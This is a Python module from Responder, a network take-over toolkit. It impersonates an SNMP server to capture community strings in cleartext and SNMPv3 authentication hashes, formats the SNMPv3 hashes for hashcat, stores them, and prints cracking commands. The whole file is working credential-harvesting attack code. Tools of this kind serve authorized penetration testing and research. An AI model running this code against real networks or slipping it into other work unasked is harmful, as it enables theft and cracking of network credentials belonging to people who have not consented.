#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
from binascii import hexlify, unhexlify
import struct

try:
    from pyasn1.codec.ber.decoder import decode
    from pyasn1.codec.ber.encoder import encode
    HAS_PYASN1 = True
except ImportError:
    HAS_PYASN1 = False
    if settings.Config.Verbose:
        print(text('[SNMP] Warning: pyasn1 not installed, SNMP server disabled'))

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler

# SNMPv3 Authentication Algorithms
SNMPV3_AUTH_ALGORITHMS = {
    b'\x06\x0c\x2b\x06\x01\x06\x03\x0f\x01\x01\x04\x00': ('usmNoAuthProtocol', None),
    b'\x06\x0a\x2b\x06\x01\x06\x03\x0a\x01\x01\x02': ('usmHMACMD5AuthProtocol', 25100),
    b'\x06\x0a\x2b\x06\x01\x06\x03\x0a\x01\x01\x03': ('usmHMACSHAAuthProtocol', 25200),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x04': ('usmHMAC128SHA224AuthProtocol', 25300),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x05': ('usmHMAC192SHA256AuthProtocol', 25400),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x06': ('usmHMAC256SHA384AuthProtocol', 25500),
    b'\x06\x09\x2b\x06\x01\x06\x03\x0a\x01\x01\x07': ('usmHMAC384SHA512AuthProtocol', 25600),
}

class SNMP(BaseRequestHandler):
    def handle(self):
        if not HAS_PYASN1:
            return
        
        try:
            data = self.request[0]
            socket = self.request[1]
            
            # Decode the SNMP message
            try:
                received_record, rest_of_substrate = decode(data)
            except Exception as e:
                if settings.Config.Verbose:
                    print(text('[SNMP] ASN.1 decode error: %s' % str(e)))
                return
            
            # Get SNMP version
            try:
                snmp_version = int(received_record['field-0'])
            except:
                if settings.Config.Verbose:
                    print(text('[SNMP] Could not determine SNMP version'))
                return
            
            # Handle SNMPv3
            if snmp_version == 3:
                self.handle_snmpv3(data, received_record, socket)
            # Handle SNMPv1/v2c
            else:
                self.handle_snmpv1v2c(data, received_record, snmp_version, socket)
        
        except Exception as e:
            if settings.Config.Verbose:
                print(text('[SNMP] Exception in handler: %s' % str(e)))
            pass
    
    def handle_snmpv3(self, data, received_record, socket):
        """Handle SNMPv3 messages and extract authentication parameters"""
        try:
            # Decode the inner security parameters
            received_record_inner, _ = decode(received_record['field-2'])
            
            # Extract fields
            snmp_user = str(received_record_inner['field-3'])
            engine_id = hexlify(received_record_inner['field-0']._value).decode('utf-8')
            engine_boots = int(received_record_inner['field-1'])
            engine_time = int(received_record_inner['field-2'])
            auth_params = hexlify(received_record_inner['field-4']._value).decode('utf-8')
            priv_params = hexlify(received_record_inner['field-5']._value).decode('utf-8')
            
            # Zero out authentication parameters in packet for hashcat
            # Hashcat recalculates HMAC over packet with auth params = zeros
            data_hex = hexlify(data).decode('utf-8')
            if auth_params and auth_params != '00' * 12:
                # Replace auth params with zeros in the packet
                zeroed_auth = '00' * (len(auth_params) // 2)
                full_snmp_msg = data_hex.replace(auth_params, zeroed_auth)
            else:
                full_snmp_msg = data_hex
            
            # Determine authentication algorithm
            auth_algo_name, hashcat_mode = self.identify_auth_algorithm(data)
            
            # If not detected by OID, infer from auth params length
            if not hashcat_mode and auth_params and auth_params != '00' * 12:
                auth_len = len(auth_params) // 2  # Convert hex to bytes
                if auth_len == 12:
                    # Could be MD5 or SHA1 - use combined mode
                    auth_algo_name = 'HMAC-MD5-96/HMAC-SHA1-96'
                    hashcat_mode = 25000
                elif auth_len == 16:
                    auth_algo_name = 'HMAC-SHA224'
                    hashcat_mode = 25300
                elif auth_len == 24:
                    auth_algo_name = 'HMAC-SHA256'
                    hashcat_mode = 25400
                elif auth_len == 32:
                    auth_algo_name = 'HMAC-SHA384'
                    hashcat_mode = 25500
                elif auth_len == 48:
                    auth_algo_name = 'HMAC-SHA512'
                    hashcat_mode = 25600
            
            # Check if this is a discovery request (no auth params and empty username)
            if (not auth_params or auth_params == '00' * 12) and (not snmp_user or snmp_user == ''):
                # Send discovery response with our engine ID
                self.send_discovery_response(socket, received_record)
                return
            
            # Check if authentication is actually being used
            if not auth_params or auth_params == '00' * 12:
                # Still save the username with noAuth indicator
                SaveToDb({
                    "module": "SNMP",
                    "type": "SNMPv3-noAuth",
                    "client": self.client_address[0],
                    "user": snmp_user,
                    "cleartext": "(noAuth)",
                    "fullhash": snmp_user + ":(noAuth)"
                })
                return
            
            # Build hashcat-compatible hash
            if hashcat_mode:
                # Format for mode 25000: $SNMPv3$<type>$<boots>$<packet>$<engine_id>$<auth_params>
                # type: 0=MD5/SHA1, 1=SHA1, 2=SHA224, etc.
                # boots: engine boots in decimal
                # packet: full SNMP packet in hex
                # engine_id: engine ID in hex
                # auth_params: authentication parameters in hex
                
                auth_type_map = {
                    25000: 0,  # MD5/SHA1 combined
                    25100: 0,  # MD5
                    25200: 1,  # SHA1
                    25300: 2,  # SHA224
                    25400: 3,  # SHA256
                    25500: 4,  # SHA384
                    25600: 5,  # SHA512
                }
                auth_type = auth_type_map.get(hashcat_mode, 0)
                
                # Build the hash in correct format
                hashcat_hash = "$SNMPv3$%d$%d$%s$%s$%s" % (
                    auth_type,
                    engine_boots,
                    full_snmp_msg,
                    engine_id,
                    auth_params
                )
                
                if settings.Config.Verbose:
                    print(text('[SNMP] SNMPv3 hash captured!'))
                    print(text('[SNMP] Crack with: hashcat -m %d hash.txt wordlist.txt' % hashcat_mode))
                    if hashcat_mode == 25000:
                        print(text('[SNMP] Note: Mode 25000 tries both MD5 and SHA1'))
                        print(text('[SNMP] Or use -m 25100 (MD5 only) or -m 25200 (SHA1 only)'))
                
                # Sanitize type name for filesystem (remove slashes)
                safe_type = auth_algo_name.replace('/', '-')
                
                SaveToDb({
                    "module": "SNMP",
                    "type": "SNMPv3-%s" % safe_type,
                    "client": self.client_address[0],
                    "user": snmp_user,
                    "hash": hashcat_hash,
                    "fullhash": hashcat_hash
                })
            else:
                # Unknown algorithm or no auth - save basic info
                SaveToDb({
                    "module": "SNMP",
                    "type": "SNMPv3",
                    "client": self.client_address[0],
                    "user": snmp_user,
                    "hash": auth_params,
                    "fullhash": "{}:{}:{}:{}".format(snmp_user, full_snmp_msg, engine_id, auth_params)
                })
            
            # Send a response (Report PDU indicating authentication failure)
            # This keeps the conversation going
            self.send_snmpv3_report(socket)
            
        except Exception as e:
            if settings.Config.Verbose:
                print(text('[SNMP] SNMPv3 parsing error: %s' % str(e)))
            pass
    
    def handle_snmpv1v2c(self, data, received_record, snmp_version, socket):
        """Handle SNMPv1/v2c messages and extract community strings"""
        try:
            community_string = str(received_record['field-1'])
            version_str = 'v1' if snmp_version == 0 else 'v2c'
            
            if settings.Config.Verbose:
                print(text('[SNMP] %s Community String: %s' % (version_str, community_string)))
            
            # Validate community string (should be printable)
            if not community_string or not self.is_printable(community_string):
                return
            
            SaveToDb({
                "module": "SNMP",
                "type": "Cleartext SNMP%s" % version_str,
                "client": self.client_address[0],
                "user": community_string,
                "cleartext": community_string,
                "fullhash": community_string,
            })
            
            # Send a response (could be a proper SNMP response or error)
            # For now, we just close the connection
            
        except Exception as e:
            if settings.Config.Verbose:
                print(text('[SNMP] SNMPv1/v2c parsing error: %s' % str(e)))
            pass
    
    def identify_auth_algorithm(self, data):
        """
        Identify the authentication algorithm used in SNMPv3
        Returns (algorithm_name, hashcat_mode)
        """
        try:
            # Look for OID patterns in the raw data
            for oid_bytes, (algo_name, hashcat_mode) in SNMPV3_AUTH_ALGORITHMS.items():
                if oid_bytes in data:
                    return (algo_name, hashcat_mode)
            
            # If not found by OID, try to infer from auth params length
            # MD5: 12 bytes, SHA1: 12 bytes, SHA224: 16 bytes, SHA256: 24 bytes, SHA384: 32 bytes, SHA512: 48 bytes
            # Note: This is less reliable
            
            return (None, None)
        except:
            return (None, None)
    
    def is_printable(self, s):
        """Check if string contains only printable characters"""
        try:
            return all(32 <= ord(c) <= 126 for c in s)
        except:
            return False
    
    def send_snmpv3_report(self, socket):
        """
        Send a minimal SNMPv3 Report PDU
        This indicates authentication failure but keeps the conversation alive
        """
        try:
            # Minimal Report PDU - just close for now
            # A proper implementation would build a valid SNMP Report PDU
            pass
        except:
            pass
    
    def send_discovery_response(self, socket, received_record):
        """
        Send SNMPv3 discovery response with engine ID
        This allows the client to send authenticated request
        """
        try:
            from pyasn1.type import univ
            from pyasn1.codec.ber.encoder import encode
            import os
            import time
            
            # Generate a random engine ID (or use a fixed one)
            # Format: 0x80 + enterprise ID (4 bytes) + format + data
            # Enterprise ID: 0x00000000 (reserved)
            # Format: 0x05 (octets - allows arbitrary data)
            # Data: 12 random bytes (17 bytes total to match hashcat requirements)
            engine_id = b'\x80\x00\x00\x00\x05' + os.urandom(12)
            
            # Engine boots and time
            engine_boots = 1
            engine_time = int(time.time()) % 2147483647
            
            # Build the SNMPv3 message with Report-PDU
            # Structure: SEQUENCE { version, globalData, securityParameters, scopedPDU }
            
            # Global data
            msg_id = int(received_record['field-1']['field-0'])
            global_data = univ.Sequence()
            global_data.setComponentByPosition(0, univ.Integer(msg_id))
            global_data.setComponentByPosition(1, univ.Integer(65507))  # max size
            global_data.setComponentByPosition(2, univ.OctetString(hexValue='04'))  # flags: reportable
            global_data.setComponentByPosition(3, univ.Integer(3))  # USM
            
            # Security parameters (USM)
            usm_params = univ.Sequence()
            usm_params.setComponentByPosition(0, univ.OctetString(hexValue=engine_id.hex()))  # engine ID
            usm_params.setComponentByPosition(1, univ.Integer(engine_boots))
            usm_params.setComponentByPosition(2, univ.Integer(engine_time))
            usm_params.setComponentByPosition(3, univ.OctetString(''))  # username
            usm_params.setComponentByPosition(4, univ.OctetString(hexValue='00' * 12))  # auth params
            usm_params.setComponentByPosition(5, univ.OctetString(''))  # priv params
            
            # Encode USM params
            usm_encoded = encode(usm_params)
            
            from pyasn1.type import tag
            
            # Build Report-PDU with IMPLICIT tagging [8]
            # The [8] tag REPLACES the SEQUENCE tag, not wraps it
            
            # VarBind: OID + value
            varbind_inner = univ.Sequence()
            varbind_inner.setComponentByPosition(0, univ.ObjectIdentifier('1.3.6.1.6.3.15.1.1.4.0'))
            varbind_inner.setComponentByPosition(1, univ.Integer(1))
            varbind_encoded = encode(varbind_inner)
            
            # VarBindList (SEQUENCE OF)
            varbind_list_content = varbind_encoded
            varbind_list_bytes = bytes([0x30, len(varbind_list_content)]) + varbind_list_content
            
            # Report-PDU content (without SEQUENCE tag, will use [8] instead)
            report_content = b''
            # request-id
            report_content += encode(univ.Integer(msg_id))
            # error-status
            report_content += encode(univ.Integer(0))
            # error-index  
            report_content += encode(univ.Integer(0))
            # variable-bindings
            report_content += varbind_list_bytes
            
            # Tag as [8] IMPLICIT (replaces SEQUENCE tag)
            report_pdu_bytes = bytes([0xa8, len(report_content)]) + report_content
            
            # Build scopedPDU as plain SEQUENCE (no [0] tag for plaintext)
            # RFC 3412: plaintext msgData is just the ScopedPDU SEQUENCE
            scoped_content = b''
            # contextEngineID (OCTET STRING)
            engine_bytes = bytes.fromhex(engine_id.hex())
            scoped_content += bytes([0x04, len(engine_bytes)]) + engine_bytes
            # contextName (OCTET STRING, empty)
            scoped_content += bytes([0x04, 0x00])
            # data (Report-PDU with implicit tag [8])
            scoped_content += report_pdu_bytes
            
            # msgData is just a SEQUENCE containing scopedPDU (no [0] tag)
            msg_data_bytes = bytes([0x30, len(scoped_content)]) + scoped_content
            
            # Use Any to include raw bytes
            msg_data = univ.Any(hexValue=msg_data_bytes.hex())
            
            # Full SNMPv3 message
            snmp_msg = univ.Sequence()
            snmp_msg.setComponentByPosition(0, univ.Integer(3))  # version snmpv3
            snmp_msg.setComponentByPosition(1, global_data)
            snmp_msg.setComponentByPosition(2, univ.OctetString(usm_encoded))
            snmp_msg.setComponentByPosition(3, msg_data)  # msgData with plaintext tag
            
            # Encode and send
            response = encode(snmp_msg)
            socket.sendto(response, self.client_address)
            
            if settings.Config.Verbose:
                print(text('[SNMP] Sent discovery response with engine ID: %s' % engine_id.hex()))
        
        except Exception as e:
            if settings.Config.Verbose:
                print(text('[SNMP] Error sending discovery response: %s' % str(e)))
